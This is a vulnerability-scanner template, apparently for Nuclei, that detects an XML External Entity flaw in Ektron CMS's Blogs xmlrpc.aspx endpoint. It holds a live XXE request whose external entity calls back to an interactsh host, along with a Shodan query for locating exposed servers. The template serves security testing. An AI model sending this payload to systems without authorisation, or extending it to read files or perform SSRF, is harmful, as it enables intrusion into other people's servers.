flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "EktronClientManager")
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, "dns")
    - status_code == 200 || status_code == 500
    type: dsl
  raw:
  - 'POST /WorkArea/Blogs/xmlrpc.aspx HTTP/1.1

    Host: {{Hostname}}


    <!DOCTYPE scan [<!ENTITY test SYSTEM "http://{{interactsh-url}}">]>

    <scan>&test;</scan>

    '
id: ektron-blog-xmlrpc-xxe
info:
  author: pussycat0x
  description: 'Detects XML External Entity (XXE) vulnerability in Ektron CMS Blogs
    component (/WorkArea/Blogs/xmlrpc.aspx). Allows unauthenticated attackers to read
    local files or perform SSRF.

    '
  metadata:
    max-request: 2
    shodan-query: http.html:"EktronClientManager"
    verified: false
  name: Ektron CMS Blogs xmlrpc.aspx - XML External Entity Injection
  reference:
  - https://www.exploit-db.com/exploits/21085
  - https://packetstormsecurity.com/files/116259/Ektron-CMS-8.5.0-File-Upload-XXE-Injection.html
  - https://www.acunetix.com/vulnerabilities/web/ektron-cms-multiple-vulnerabilities
  severity: high
  tags: xxe,ektron,cms,vuln
